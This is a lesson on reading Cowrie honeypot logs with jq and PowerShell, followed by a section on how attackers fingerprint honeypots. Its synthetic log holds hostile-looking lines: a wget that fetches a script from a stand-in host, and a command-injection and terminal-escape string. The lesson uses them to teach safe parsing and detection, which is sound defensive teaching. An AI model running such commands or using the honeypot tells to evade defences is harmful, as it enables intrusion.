# Read what arrived: Cowrie logs, jq, PowerShell and how visitors spot a honeypot

Lesson 9 of the [deception and honeypots track](Deception-and-Honeypots-Start-Here.md), the last lesson of **track 2**. You read the JSON log a Cowrie sensor writes, count what visitors tried, catch a visitor who touched your decoy credential, reuse the detector you wrote in lesson 5, and then switch sides: how does a visitor tell it is Cowrie, and what can you change? A foundations side page to [Deception alerts in the SIEM](Deception-and-Honeypots-Alerts-in-the-SIEM.md) and [Cloud Cowrie for a weekend](Deception-and-Honeypots-Cloud-Cowrie-Weekend.md). Next: back to the [track hub](Deception-and-Honeypots-Start-Here.md).

> Unfamiliar word or acronym? The [Glossary](Glossary.md) defines it.

> **Status: the `jq` and Python parts were run once on Linux against invented logs; no real sensor log was read.** On **2026-10-22** the author ran every Bash command in exercises 1 to 6 with Python 3.13.5 and `jq` 1.7, against a file the lesson builds from invented events. The PowerShell commands are **est.** (not run; PowerShell was not available). Real Cowrie output was never seen by the author: the invented lines follow the field names in Cowrie's output documentation and are labeled synthetic. Exercise 7 and the sensor checks in exercise 8 need a sensor from lesson 8 and are **est.**

> **Prerequisites.** [Deception alerts in the SIEM](Deception-and-Honeypots-Alerts-in-the-SIEM.md) (lesson 5, for `detect.py`), and the lure script from [lesson 8](Deception-and-Honeypots-Cloud-Cowrie-Weekend.md#exercise-1-make-the-lure-a-honeytoken) (it writes one file on your own computer). `jq` for Bash users (`sudo apt install jq` or your system's equivalent); PowerShell 5.1 or 7 for PowerShell users; Python 3.11 or newer. [JSON](Glossary.md) and [the terminal and your first script](Terminal-and-Your-First-Script.md) help. About 3 to 4 hours (est.). **Cost: none for exercises 1 to 6**, which use invented data and need no cloud account. Exercise 7 reads logs from a sensor you built in lesson 8, at your own provider bill.

## What you will be able to do

- Say what each Cowrie event records and which fields a visitor controls.
- Read a `cowrie.json` file with `jq` (Bash) or `ConvertFrom-Json` (PowerShell) without being fooled by a hostile line or a broken one.
- Count attempts by source, user name and password, and list commands per session.
- Find the visitor who read your decoy file, and the one who used your decoy credential.
- Run the lesson 5 detector on a sensor log shape.
- List the ways a visitor can tell Cowrie from a real machine, and say which you can change.

## The free theory path

Exercises 1 to 6 are the free path: an invented log, no account, no server. They teach the same reading skills you need for a real log. If a real sensor is not for you, you lose nothing by stopping after exercise 6 and the section on [fingerprinting](#flip-the-board-how-a-visitor-spots-cowrie-and-how-you-harden-it).

## What a sensor log looks like

Cowrie writes one JSON object per line to `var/log/cowrie/cowrie.json` (its default configuration turns this output on), in UTC. Its output documentation (read 2026-10-22) says every event carries `eventid`, `message`, `sensor`, `timestamp` (ISO 8601, UTC), `session` and `src_ip`, and that events from a connection also carry `protocol` (`ssh` or `telnet`), `src_port`, `dst_ip` and `dst_port`. Because of the port redirect in lesson 8, `dst_port` will say 2222 or 2223, not 22 or 23.

| Event id | What it means | Fields a visitor controls |
|---|---|---|
| `cowrie.session.connect` | A new connection; the first event of a visit. | None (the address and port come from the network). |
| `cowrie.client.version` | The visitor's SSH client name. | `version`. |
| `cowrie.client.kex` | The visitor's list of supported algorithms, and a fingerprint of it (HASSH). | The lists. |
| `cowrie.login.failed`, `cowrie.login.success` | A login attempt the imitation refused or accepted. | `username`, `password` (or a public key). |
| `cowrie.command.input` | A command line the visitor typed. | `input`. |
| `cowrie.session.file_download`, `...file_download.failed`, `...file_upload` | A file arrived, or a download did not complete. | `url`, file names. |
| `cowrie.direct-tcpip.request` | The visitor asked to relay traffic through the sensor. | The destination. |
| `cowrie.session.closed` | The visit ended. | None (`duration_ms` is the sensor's measure). |

Two facts that matter for safety. **`success` is a statement about the imitation, not about a real account**: it means Cowrie's login list accepted the pair. And **everything a visitor controls is hostile text**: it can hold quotes, control characters, text that looks like another log line, text that looks like a command. Lesson 5 made the same point with a detector; here it applies to every tool you point at the file, including `jq` and your terminal.

One more property of real files: a copy taken while the sensor is writing can end mid-line, and a rotated or pasted file can have junk in it. `jq` stops at the first line that is not valid JSON, so the commands below read the file **line by line** and skip what does not parse.

## Exercise 1: build an invented sensor log

Save this as `make_session.py` in the folder where you ran `make_lure.py`. It reads the lure file and builds 28 lines: four visits, and one broken line at the end. **Nothing in it came from a real attacker or a real sensor.** Addresses are from the documentation ranges reserved for examples (RFC 5737).

```python
# Builds SYNTHETIC sensor events in the shape Cowrie documents, one JSON object per line,
# like var/log/cowrie/cowrie.json. Nothing here came from a real attacker or a real sensor.
# Addresses are from the documentation ranges (RFC 5737). Needs lure/deploy-notes-OLD.txt
# from make_lure.py. Run:   python3 -I make_session.py > cowrie.json
import json
from datetime import datetime, timedelta, timezone

lure = dict(
    line.split(": ", 1) for line in open("lure/deploy-notes-OLD.txt").read().splitlines() if ": " in line
)
T0 = datetime(2026, 1, 1, 12, 0, 0, tzinfo=timezone.utc)
out = []

def ev(sec, eventid, ip, session, **extra):
    stamp = (T0 + timedelta(seconds=sec)).strftime("%Y-%m-%dT%H:%M:%S.%fZ")
    out.append(json.dumps({"eventid": eventid, "message": eventid, "src_ip": ip, "session": session,
                           "sensor": "lab", "timestamp": stamp, "protocol": "ssh",
                           "dst_ip": "192.0.2.10", "dst_port": 2222, **extra}))

# Visit A: a bot. Five wrong guesses, an accepted login, a scripted batch of commands.
A, a = "203.0.113.7", "a1a1a1a1"
ev(0, "cowrie.session.connect", A, a, src_port=40001)
ev(1, "cowrie.client.version", A, a, version="SSH-2.0-LabClient_1.0")
for i, pw in enumerate(["123456", "password", "admin", "root", "toor"]):
    ev(2 + i, "cowrie.login.failed", A, a, username="root", password=pw)
ev(8, "cowrie.login.success", A, a, username="root", password="letmein")
for i, cmd in enumerate(["uname -a", "cat /proc/cpuinfo", "cat /home/phil/deploy-notes-OLD.txt",
                         "wget http://example.com/x.sh -O /tmp/x.sh", "passwd"]):
    ev(10 + i, "cowrie.command.input", A, a, input=cmd)
ev(15, "cowrie.session.file_download.failed", A, a, url="http://example.com/x.sh")
ev(30, "cowrie.session.closed", A, a, duration_ms=30000)

# Visit B: noise. One guess, gone.
B, b = "198.51.100.23", "b2b2b2b2"
ev(40, "cowrie.session.connect", B, b, src_port=40002)
ev(41, "cowrie.login.failed", B, b, username="admin", password="admin")
ev(42, "cowrie.session.closed", B, b, duration_ms=2000)

# Visit C: someone who tries to tell whether this is a real machine (see the SANS ISC diary
# in the register): a password that names the trap and should never work, then probe commands.
C, c = "203.0.113.99", "c3c3c3c3"
ev(50, "cowrie.session.connect", C, c, src_port=40003)
ev(51, "cowrie.login.success", C, c, username="admin", password="honeypot-test")
ev(52, "cowrie.command.input", C, c, input="busybox echo -e '\\x44\\x49\\x52'")
ev(53, "cowrie.command.input", C, c, input="cat /proc/self/exe")
ev(54, "cowrie.session.closed", C, c, duration_ms=4000)

# Visit D: uses the planted lure credential, then sends hostile text. The text is data.
D, d = "192.0.2.66", "d4d4d4d4"
ev(60, "cowrie.session.connect", D, d, src_port=40004)
ev(61, "cowrie.login.failed", D, d, username=lure["user"], password=lure["password"])
ev(62, "cowrie.command.input", D, d, input='x"; $(touch /tmp/pwned) \x1b[2J {"eventid": "cowrie.login.success"}')
ev(63, "cowrie.session.closed", D, d, duration_ms=3000)

out.append("this line is not json {{{")
print("\n".join(out))
```

**Predict.** How many lines will the file have, and will `jq .` read all of them?

**Do.**

```bash
cd ~/deception-lab/cloud
python3 -I make_lure.py
python3 -I make_session.py > cowrie.json
wc -l cowrie.json
jq . cowrie.json > /dev/null; echo "exit=$?"
```

```powershell
Set-Location $HOME\deception-lab\cloud
py -3 -I make_lure.py
py -3 -I make_session.py | Set-Content -Encoding ascii cowrie.json
(Get-Content cowrie.json).Count
```

(Windows PowerShell 5.1 writes UTF-16 with a plain `>`; `Set-Content -Encoding ascii` avoids that. The text is plain ASCII, because the escape character inside one line is written as `\u001b`.)

**Check.** `28 cowrie.json`. `jq .` prints a parse error about the last line and exits with a non-zero code (5 on `jq` 1.7). That is the lesson: one bad line stops a naive read. From now on every command skips what does not parse.

**Undo.** `rm -r cowrie.json lure` (PowerShell: `Remove-Item -Recurse cowrie.json, lure`).

## Exercise 2: count events by type

`jq -R` reads each line as plain text; `fromjson?` parses it and quietly gives nothing if it fails; `objects` keeps only JSON objects (a line that is just `5` or `"x"` would otherwise break the next step).

**Predict.** Which event type is the most common in the file, and how many lines are *not* events?

**Do.**

```bash
# events by type
jq -rR 'fromjson? | objects | .eventid' cowrie.json | sort | uniq -c | sort -rn
```

```powershell
# load the events, skipping what does not parse
$events = Get-Content cowrie.json | ForEach-Object {
    try { $e = $_ | ConvertFrom-Json -ErrorAction Stop } catch { return }
    if ($e -is [pscustomobject] -and $e.eventid) { $e }
}
$events | Group-Object eventid | Sort-Object Count -Descending | Select-Object Count, Name
```

**Check.** Seven lines (counts only; ties may print in either order):

```text
      8 cowrie.command.input
      7 cowrie.login.failed
      4 cowrie.session.connect
      4 cowrie.session.closed
      2 cowrie.login.success
      1 cowrie.session.file_download.failed
      1 cowrie.client.version
```

They add to 27, so 28 lines minus 1 broken line. `command.input` leads because one visit ran five commands. (PowerShell 7 may turn the `timestamp` strings into dates in your own time zone; the counts are the same. Add `-DateKind String` to `ConvertFrom-Json` in PowerShell 7.5 or newer to keep them as text.)

**Undo.** Nothing.

## Exercise 3: who guessed what, from where

`tojson` writes each value as a quoted JSON string, which escapes quotes and control characters. Use it every time you print a field a visitor controls.

**Predict.** Which source tried the most wrong logins? Does any user name and password pair appear twice?

**Do.**

```bash
# failed logins per source
jq -rR 'fromjson? | objects | select(.eventid=="cowrie.login.failed") | .src_ip' cowrie.json | sort | uniq -c | sort -rn
# user name and password pairs
jq -rR 'fromjson? | objects | select(.eventid=="cowrie.login.failed") | [.username, .password] | map(tojson) | join(" ")' cowrie.json | sort | uniq -c | sort -rn
```

```powershell
$events | Where-Object eventid -eq 'cowrie.login.failed' | Group-Object src_ip | Sort-Object Count -Descending | Select-Object Count, Name
$events | Where-Object eventid -eq 'cowrie.login.failed' |
    Group-Object { ConvertTo-Json -Compress -InputObject @($_.username, $_.password) } |
    Sort-Object Count -Descending | Select-Object Count, Name
```

**Check.** `203.0.113.7` has 5, `198.51.100.23` has 1 and `192.0.2.66` has 1. Every pair appears once, so on a log this small there are no repeats; on a real log that is where the common pairs show up. Compare with the public numbers in [lesson 7](Deception-and-Honeypots-Cloud-Sensor-Anatomy.md#what-arrives-from-a-public-dataset) before you read anything into yours.

**Undo.** Nothing.

## Exercise 4: what they typed, and why not to print it raw

**Predict.** One visitor's command contains a terminal escape sequence. What happens if you print it with `jq -r`?

**Do.**

```bash
# commands per session, made safe to print
jq -rR 'fromjson? | objects | select(.eventid=="cowrie.command.input") | "\(.session) \(.input | tojson)"' cowrie.json
# the same field printed raw, with control characters made visible
jq -rR 'fromjson? | objects | select(.eventid=="cowrie.command.input") | .input' cowrie.json | cat -v | tail -n 1
```

```powershell
$events | Where-Object eventid -eq 'cowrie.command.input' |
    ForEach-Object { '{0} {1}' -f $_.session, (ConvertTo-Json -Compress -InputObject ([string]$_.input)) }
```

**Check.** The first command prints eight lines; the last one is `d4d4d4d4 "x\"; $(touch /tmp/pwned) \u001b[2J {\"eventid\": \"cowrie.login.success\"}"`, with the escape written out as `\u001b`. The second prints that same command with the escape shown as `^[[2J`; without `cat -v`, your terminal would have **acted** on `ESC [2J` (clear the screen) instead of showing it. Nothing in the text ran: `$(touch /tmp/pwned)` is only characters in a field, and `ls /tmp/pwned` finds no such file. Two habits again: print attacker-controlled fields through `tojson` (or `cat -v`), and never paste a field into a shell command.

**Undo.** Nothing.

## Exercise 5: who touched the decoy

Your decoy is a file and a credential. Two kinds of touch: someone **read the file** (a `cat` of its name in a command), and someone **used the credential** (a login attempt with the invented user name). The credential was made at run time, so the filter takes it from the lure file instead of having it written into the lesson.

**Predict.** Which visitors read the file, and which used the credential? Are they the same one?

**Do.**

```bash
# lure file read
jq -cR 'fromjson? | objects | select(.eventid=="cowrie.command.input" and (.input | contains("deploy-notes-OLD"))) | {src_ip, session, input}' cowrie.json
# lure credential used
user=$(sed -n 's/^user: //p' lure/deploy-notes-OLD.txt)
jq -cR --arg u "$user" 'fromjson? | objects | select(.username == $u) | {eventid, src_ip, session}' cowrie.json
```

```powershell
$events | Where-Object { $_.eventid -eq 'cowrie.command.input' -and $_.input -like '*deploy-notes-OLD*' } | Select-Object src_ip, session, input
$user = (Select-String -Path lure\deploy-notes-OLD.txt -Pattern '^user: (.*)$').Matches[0].Groups[1].Value
$events | Where-Object { $_.username -eq $user } | Select-Object eventid, src_ip, session
```

**Check.** The file was read by `203.0.113.7` (session `a1a1a1a1`, the command `cat /home/phil/deploy-notes-OLD.txt`), and the credential was used by `192.0.2.66` (session `d4d4d4d4`, a `cowrie.login.failed`). Different visitors. In this track the credential works only against the sensor, so a use on a real log tells you somebody read the file and tried it, and it tells you nothing about any other system.

**Undo.** Nothing.

## Exercise 6: reuse the detector from lesson 5

The detector in [lesson 5](Deception-and-Honeypots-Alerts-in-the-SIEM.md#exercises) was written for exactly this shape: it parses each line, compares `eventid`, `src_ip` and `timestamp`, drops what does not fit and counts it. Save its `detect.py` in this folder and run it on the log.

**Predict.** Visit A made five wrong guesses and then an accepted login. Which rules fire? Will visit D's single failed login with the lure credential fire anything?

**Do.**

```bash
python3 -I detect.py cowrie.json; echo "exit=$?"
```

```powershell
py -3 -I detect.py cowrie.json
$LASTEXITCODE
```

**Check.**

```text
dropped: {"not_json": 1, "too_long": 0, "bad_shape": 0}
{"rule": "brute_force", "level": 10, "mitre": "T1110 Brute Force", "src_ip": "203.0.113.7", "at": "2026-01-01T12:00:06.000000Z"}
{"rule": "success_after_brute_force", "level": 12, "mitre": "none (honeypot-specific)", "src_ip": "203.0.113.7", "at": "2026-01-01T12:00:08.000000Z"}
exit=0
```

Both rules fire for `203.0.113.7`. The lure visit does not: one failed login is not five. That is the gap exercise 5 fills: the lure filters are **new rules**, and they should alert on a single event, because nobody legitimate has a reason to read the decoy. On a real log, expect the detector's `too_long` count to be above zero: it drops any line over 4,096 bytes, and Cowrie's `cowrie.client.kex` lines (lists of algorithms) are the likely long ones (est.; the author has seen no real line). Decide whether to raise the limit, with a reason.

For a SIEM, the same three ideas (a chain after failures, a read of the lure, a use of the lure credential) are the rules to write, keyed on `eventid`, as the draft in lesson 5 does. Whether Wazuh's JSON decoder handles Cowrie's real lines, and how the file reaches the manager, is **not tested** in this track: lesson 5's rules were never loaded into a manager, and the design's pull-only log path to Wazuh is not covered by lessons 7 to 9. That part remains later work.

**Undo.** Nothing.

## What they did, mapped to ATT&CK

In a real log the commands carry the technique. The invented session A is a small example of how to read it. These mappings are the author's reading of the technique pages (read 2026-10-22), not Cowrie's labels:

| Command in session A | Likely technique (the id is in the link) |
|---|---|
| `uname -a`, `cat /proc/cpuinfo` | [System Information Discovery](https://attack.mitre.org/techniques/T1082/) |
| `cat /home/phil/deploy-notes-OLD.txt` | [Unsecured Credentials: Credentials In Files](https://attack.mitre.org/techniques/T1552/001/) (it went looking for a credentials file) |
| `wget http://example.com/x.sh ...` | [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/) (an attempt to bring in a file; with outgoing traffic closed it fails and the log says so) |
| `passwd` | [Account Manipulation](https://attack.mitre.org/techniques/T1098/) (changing a credential; compare the ISC finding in lesson 7 that most scripted sessions end up changing the password) |
| Five wrong guesses | [T1110 Brute Force](https://attack.mitre.org/techniques/T1110/), as in lesson 5 |

The accepted login is **not** [T1078 Valid Accounts](https://attack.mitre.org/techniques/T1078/): the account is not real. It is a honeypot event.

## Exercise 7: your own sensor's logs (your own account)

This is the part that needs lesson 8. Pull the logs as in lesson 8 exercise 7, then read the real file. The commands are the same, with the path changed and your own visits taken out:

```bash
ME=203.0.113.10    # your public address, from lesson 8
# visits that are not yours
jq -rR --arg me "$ME" 'fromjson? | objects | select(.eventid=="cowrie.session.connect" and .src_ip != $me and .src_ip != "127.0.0.1") | .timestamp' cowrie/cowrie.json | sort | head -n 1
# top user names, safe to print
jq -rR --arg me "$ME" 'fromjson? | objects | select(.eventid=="cowrie.login.failed" and .src_ip != $me) | .username | tojson' cowrie/cowrie.json | sort | uniq -c | sort -rn | head -n 10
```

```powershell
$Me = "203.0.113.10"
$events = Get-Content cowrie\cowrie.json | ForEach-Object {
    try { $e = $_ | ConvertFrom-Json -ErrorAction Stop } catch { return }
    if ($e -is [pscustomobject] -and $e.eventid) { $e }
}
$events | Where-Object { $_.eventid -eq 'cowrie.session.connect' -and $_.src_ip -ne $Me -and $_.src_ip -ne '127.0.0.1' } |
    ForEach-Object { (Get-Date $_.timestamp).ToUniversalTime().ToString('o') } | Sort-Object | Select-Object -First 1
$events | Where-Object { $_.eventid -eq 'cowrie.login.failed' -and $_.src_ip -ne $Me } |
    Group-Object { ConvertTo-Json -Compress -InputObject ([string]$_.username) } | Sort-Object Count -Descending | Select-Object -First 10 Count, Name
```

(Rotated files sit next to `cowrie.json`; run the same filter over each, or join them first.) **Check.** The first command prints the time of the first visit that was not yours; subtract your lesson 8 `T_open` and write that **time to first attempt** down. The second shows the user names visitors tried. Compare both with the ISC's published numbers in lesson 7, and say in one sentence where they differ and one reason why a single sensor over a weekend is a poor sample. Then write your summary as **counts only**: no addresses, no passwords, no raw lines. Raw logs stay on your computer and are deleted on your retention date.

## Flip the board: how a visitor spots Cowrie, and how you harden it

Now you are the visitor. The sensor is software that imitates a machine, and imitations leave marks. Each row below was read from Cowrie's own files or a published analysis on 2026-10-22; the right-hand column says what you can change.

| Tell | Where it comes from | What you can do |
|---|---|---|
| A user called `phil` | The FAQ: "The default Cowrie user is called `phil` these days. Having the same user always available is an easy way to identify Cowrie, so it's recommended to change this." The built-in login list also accepts `phil` with any password. | Rename the user in the fake file system (`fsctl`, `mv /home/phil /home/NAME`) and in `/etc/passwd` (the FAQ shows both), and write your own `etc/userdb.txt`. |
| `root` logs in with nearly any password | The built-in list accepts `root` with any password except `root`, `123456` and anything containing "honeypot" (and the shipped example does much the same). | A stricter `userdb.txt`, or no root. Trade-off: fewer accepted logins means fewer sessions to read. |
| Credentials that should never work, work | The ISC diary of 2026-04-08: visitors try values such as `definitely_not_valid_creds` and `youjustgotindexed`; if one succeeds, they know. The diary notes Cowrie's random-login mode can make odd pairs work. | Keep the list strict. Treat a success on such a pair as a **detection**: it is visit C in the invented log, and exercise 5's filter style catches it. |
| Banners that disagree with each other | The default file sets the SSH banner to `SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u3`, but the `ssh -V` text inside the shell to `OpenSSH_7.9p1, OpenSSL 1.1.1a  20 Nov 2018`, the kernel to `6.1.0-21-amd64` (a 2024 build date), and the README says the bundled file system resembles "a Debian 5.0 installation". Several different eras in one machine. | Make `[ssh] version`, `[shell] ssh_version`, `kernel_version`, `kernel_build_string` and the hostname tell one story. You cannot change the old file system's age without rebuilding it (Cowrie documents `createfs` and `fsctl`). |
| Commands that real systems answer and the imitation cannot | The ISC diary of 2024-07-11: attackers read the first bytes of `/proc/self/exe` with `dd` or `cat`, copy a file into `/dev/shm`, or run an odd marker command, "to eliminate some honeypots as this command will not work in simulations like cowrie". | Little. This is the limit of a program that imitates a system. Log it; it is information (visit C). |
| Packages that "install" | The ISC diary of 2026-04-08: if a bogus package installs, "the attacker knows they are connected to a honeypot". | Nothing cheap. It is what an imitation does. |
| The SSH algorithm list | The same diary: some attackers "look for SSH artifacts, such as the number and types of ciphers supported". The default configuration lists the ciphers Cowrie offers. | The config has `ciphers`, `macs` and `compression` settings (est. effect on the tell). |

Some of these you can fix and some you cannot, which is the honest answer. The ISC analyst's own view, in the same diary, is that they are "mostly interested in internet-wide scans" and "not going to detect targeted attacks or zero days", and that hiding the honeypot may not be worth the effort. For a lesson, the goal is not to be invisible. It is to know which visits were **testing** you, and to log them.

### Exercise 8: find the tells in your own configuration

**Predict.** Will the default configuration, as shipped, give a consistent picture of one machine? Count the different years and versions you expect.

**Do.** Read the default settings from the Cowrie repository (read-only, no sensor needed):

```bash
curl -sL https://raw.githubusercontent.com/cowrie/cowrie/HEAD/src/cowrie/data/etc/cowrie.cfg.dist -o cowrie.cfg.dist
grep -n -E '^(hostname|kernel_version|kernel_build_string|ssh_version|version) *=' cowrie.cfg.dist
```

```powershell
Invoke-WebRequest https://raw.githubusercontent.com/cowrie/cowrie/HEAD/src/cowrie/data/etc/cowrie.cfg.dist -OutFile cowrie.cfg.dist
Select-String -Path cowrie.cfg.dist -Pattern '^(hostname|kernel_version|kernel_build_string|ssh_version|version) *='
```

**Check.** On 2026-10-22 the default branch printed `hostname = svr04`, `kernel_version = 6.1.0-21-amd64`, `kernel_build_string = #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03)`, `ssh_version = OpenSSH_7.9p1, OpenSSL 1.1.1a  20 Nov 2018` and `version = SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u3`: an SSH 9.2 banner on the wire, a 7.9 text in the shell. (The file changes with the project; yours may differ.) **If you have a sensor** (est.), also look at what the wire shows, using your own client against your own sensor with keys off: `ssh -v -o PubkeyAuthentication=no -p 22 root@SENSOR 2>&1 | grep -i 'remote software version'`, and inside the shell `ssh -V` and `cat /etc/passwd`. Then edit your configuration so the story agrees, restart, and look again.

**Undo.** `rm cowrie.cfg.dist`. A configuration change on a running sensor is a restart of the honeypot, which is also a change to the exposed system: do it in a window, and note it in your plan.

## Build, break, detect, evade, defend

- **Build.** The invented log, the `jq` and PowerShell reads, the lure filters, and (if you built one) your own log summary.
- **Break.** Make the read fail: add a line that is `5`, one that is `null`, one that is an array, one cut in half, one with a missing `eventid`. Which commands survive, and which stop? Fix one. (`objects` and `fromjson?` are the fixes you have already used.)
- **Detect.** Three rules for the lure visits, each alerting on a **single** event: a command that names the decoy file, a login with the decoy user, and an accepted login whose password matches a "should never work" list. Write them in `jq` first, then say how a SIEM would key on the same `eventid` and field. Add a fourth: a visit that stops after the first command (a probe, like visit C).
- **Evade.** A visitor who knows the tells in the table stays away, or arrives with credentials that are not on any list. Your lure rule never fires, and silence means "nobody swung by", not "nobody was here". Write that sentence in your plan so you do not read the quiet as safety.
- **Defend.** Close the gaps you can: rename `phil`, align the banners, tighten the login list. Write down the gaps you cannot, and keep the guardrails from lesson 7 as the real defense, since the imitation is not.
- **Flip the board.** Done above. One more turn: you read a published honeypot log that lists one address as an "attacker". What would you need to know before you called that address bad? (Lesson 6: it is often somebody else's machine.)

## Common mistakes

| Mistake | Why it hurts | Better |
|---|---|---|
| `jq .` on the whole file. | One broken line ends the read, silently on a pipe. | Read line by line: `jq -R` with `fromjson?` and then `objects`, as in exercise 2. |
| `jq -r .input` to a terminal. | Control characters act on your terminal. | `tojson` or `cat -v`. |
| Matching a substring of the whole line. | A visitor puts your match text in a field. | Compare a parsed field (lesson 5). |
| Counting your own visits. | Your tests inflate the numbers and move the "first attempt". | Exclude your address and loopback. |
| Reading the silence of a lure as safety. | A careful visitor avoids it. | The sentence in the "Evade" step above. |
| Posting a raw log or an address list. | Other people's data, and the addresses often belong to victims. | Counts and redacted examples only. |

## Claims register

Retrieved 2026-10-22 unless stated.

| Claim | Source | Status |
|---|---|---|
| Shared event attributes, `protocol`/`src_port`/`dst_ip`/`dst_port` on connection events, and the event ids and fields in the table | [Cowrie output documentation](https://docs.cowrie.org/en/latest/_sources/OUTPUT.rst.txt) | Read |
| JSON log on by default, at `var/log/cowrie/cowrie.json`; rotating log type; the ssh/shell/kernel/hostname defaults quoted in the fingerprint table | [Cowrie default configuration](https://raw.githubusercontent.com/cowrie/cowrie/HEAD/src/cowrie/data/etc/cowrie.cfg.dist) | Read on the default branch, which is newer than release 3.1.3 by an unknown amount. Exercise 8 reprints the lines |
| The default user is `phil`; changing it needs both the fake file system and `/etc/passwd`; the built-in login list | [Cowrie FAQ](https://raw.githubusercontent.com/cowrie/cowrie/HEAD/docs/FAQ.rst), [Cowrie source, `core/auth.py` at v3.1.3](https://raw.githubusercontent.com/cowrie/cowrie/v3.1.3/src/cowrie/core/auth.py), [example login list](https://raw.githubusercontent.com/cowrie/cowrie/HEAD/src/cowrie/data/etc/userdb.example) | Read |
| The bundled file system "resembling a Debian 5.0 installation" | [Cowrie README](https://raw.githubusercontent.com/cowrie/cowrie/HEAD/README.rst) | Read. That it still is so in release 3.1.3 is **est.** |
| Attackers read `/proc/self/exe`, copy to `/dev/shm`, or use marker commands to test for a simulation | [ISC diary, "Understanding SSH Honeypot Logs: Attackers Fingerprinting Honeypots"](https://isc.sans.edu/diary/Understanding+SSH+Honeypot+Logs+Attackers+Fingerprinting+Honeypots/31064), 2024-07-11 | Read. One analyst's observation, and "I believe" is the diary's own hedge on the purpose |
| Visitors use credentials that should not work; packages that appear to install; cipher lists; the analyst's view on hiding | [ISC diary, "More Honeypot Fingerprinting Scans"](https://isc.sans.edu/diary/More+Honeypot+Fingerprinting+Scans/32878), 2026-04-08 | Read |
| 1,206,566 sessions from six sensors, 2022 to 2026, and the shares in lesson 7 | [ISC diary, "DShield (Cowrie) Honeypot Stats and When Sessions Disconnect"](https://isc.sans.edu/diary/DShield+Cowrie+Honeypot+Stats+and+When+Sessions+Disconnect/32840), 2026-03-30 | Read |
| Technique names for the four linked techniques, and for Brute Force and Valid Accounts (ids in the table above) | [MITRE ATT&CK](https://attack.mitre.org/techniques/T1082/) and the pages for the other ids | Names read; which technique a given command maps to is the author's reading |
| The synthetic log, the `jq` filters and the lesson 5 detector's output on it | Run on Linux with `jq` 1.7 and Python 3.13.5 on 2026-10-22 | Run. PowerShell: **est.** |
| `cowrie.client.kex` lines are long enough to be dropped by the lesson 5 detector | None | **est.**: no real line was seen |
| Wazuh ingestion of real Cowrie lines | None | **UNVERIFIED**: not tested in this track |

Not verified, plainly: any real Cowrie log; every PowerShell command; the PowerShell 7 date handling beyond the note in exercise 2; whether `ConvertTo-Json` of an array behaves the same on 5.1 and 7; the sensor checks in exercises 7 and 8; the effect of changing `ciphers`.

Next: back to the [track hub](Deception-and-Honeypots-Start-Here.md).
